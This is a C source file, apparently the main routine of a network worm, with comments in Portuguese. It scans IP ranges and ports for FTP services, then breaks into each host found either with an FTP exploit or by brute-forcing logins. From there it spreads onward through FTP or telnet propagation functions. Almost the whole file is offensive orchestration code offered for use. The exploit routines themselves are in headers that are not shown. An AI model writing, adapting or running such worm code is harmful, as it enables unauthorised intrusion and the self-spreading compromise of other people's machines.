#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include "brutexor.h"
#include "exploit.h"
#include "lista.h"
#include "propagation.h"
#include "scanner.h"

int ssh_bruteforce(char *, int);

int main(int argc, char **argv) {
	/* --- VARIAVEIS --- */
	char *first_IP, *IP;
	char *IP_opt;
	char *port_opt;
	char *user;
	int IP_min, IP_max, port_min, port_max;
	int status, random, port;
	int i, j;
	int ftp_fd;
	int bruteforce_flag, exploit_flag;
	no n, m;
	lista conexoes;
	conexao c, selecionada;
	login l;

	/* --- LEITURA ARGUMENTOS --- */
	if (argc == 1) {
		port_opt = "1-1024";
		IP_opt = "192.168.0.100-255";
	} else {
		if (argc == 3) port_opt = argv[2];
		else port_opt = "1-1024";
		IP_opt = argv[1];
	}

	signal(SIGPIPE, SIG_IGN);
	get_option(IP_opt, port_opt, &first_IP, &IP_min, &IP_max, &port_min, &port_max);
	IP = (char *) malloc(sizeof(char)*MAX_IP_SIZE);

	/* --- SCANNER --- */
	conexoes = constroi_lista();
	for (i = IP_min; i <= IP_max; i++) {
		for (j = port_min; j <= port_max; j++) {
			sprintf(IP, "%s%d", first_IP, i);
			status = scanner(IP, j, conexoes);
			if (status == -2) {
				j = port_max;
			}
			memset(IP, '\0', sizeof(MAX_IP_SIZE));
		}
	}

	printf("Scanning complete! Starting attack...\n");

	/*no n;
	for (n = primeiro_no(conexoes); n; n = proximo_no(n)) {
		conexao d = (conexao) conteudo(n);
		printf("%s:%d - %s\n", d->IP, d->port, d->banner);
	}*/

	for (i = IP_min; i <= IP_max; i++) {
		sprintf(IP, "%s%d", first_IP, i);

		selecionada = NULL;
		ftp_fd = 0;
		bruteforce_flag = 0;
		exploit_flag = 0;

		/* --- EXPLOIT ou FORCA BRUTA --- */

		random = rand() % 2;
		if (random == 0) {
			/* --- Exploit --- */
			exploit_flag = 1;
			printf("Trying exploit %s\n", IP);
			for (n = primeiro_no(conexoes); n; n = proximo_no(n)) {
				c = (conexao) conteudo(n);
				if ( (strcmp(c->IP, IP) == 0) && (strstr(c->banner, "FTP") != NULL) ) {
					selecionada = c;
					n = NULL;
				}
			}
			if (selecionada == NULL) {
				printf("FTP is down %s\n", IP);
				exploit_flag = 0;
			} else {
				ftp_fd = ftp_exploit(selecionada->IP, selecionada->port);

				if (!ftp_fd) {
					printf("Can't exploit FTP %s\n", IP);
					exploit_flag = 0;
					bruteforce_flag = 1;
					for (j = 1; j <= MAX_CHAR; j++) {
						user = (char *) malloc(sizeof(char)*i+1);
						ftp_fd = get_user(user, j, j, l, selecionada->IP, selecionada->port);
						free(user);
						if (ftp_fd) break;
					}
					if (!ftp_fd) {
						printf("Can't bruteforce FTP %s\n", IP);
					   	bruteforce_flag = 0;
					}
				}
			}
		} else {
			/* --- Bruteforce --- */
			bruteforce_flag = 1;
			printf("Trying bruteforce %s\n", IP);
			for (n = primeiro_no(conexoes); n; n = proximo_no(n)) {
				c = (conexao) conteudo(n);
				if ( (strcmp(c->IP, IP) == 0) && (strstr(c->banner, "FTP") != NULL) ) {
					selecionada = c;
					n = NULL;
				}
			}
			if (selecionada == NULL) {
				printf("FTP is down %s\n", IP);
				bruteforce_flag = 0;
			} else {
				for (j = 1; j <= MAX_CHAR; j++) {
					user = (char *) malloc(sizeof(char)*i+1);
					ftp_fd = get_user(user, j, j, l, selecionada->IP, selecionada->port);
					free(user);
					if (ftp_fd) break;
				}

				if (!ftp_fd) {
					printf("Can't bruteforce FTP %s\n", IP);
					bruteforce_flag = 0;
					exploit_flag = 1;
					ftp_fd = ftp_exploit(selecionada->IP, selecionada->port);
					if (!ftp_fd) {
						printf("Can't exploit FTP %s\n", IP);
						exploit_flag = 0;
					}
				}
			}
		}

		if (!ftp_fd) {
			printf("Can't propagate to %s\n-----\n", IP);
			memset(IP, '\0', sizeof(MAX_IP_SIZE));
			continue;
		}

		/* --- PROPAGACAO --- */
		if (exploit_flag) {
			ftp_propagate(ftp_fd, first_IP, IP_min, IP_min, port_min, port_max);
		} else if (bruteforce_flag) {
			telnet_propagate(l, IP, first_IP, IP_min, IP_max, port_min, port_max);
		}

		/* --- FIM --- */
		printf("-----\n");
		close(ftp_fd);
		memset(IP, '\0', sizeof(MAX_IP_SIZE));
	}
}

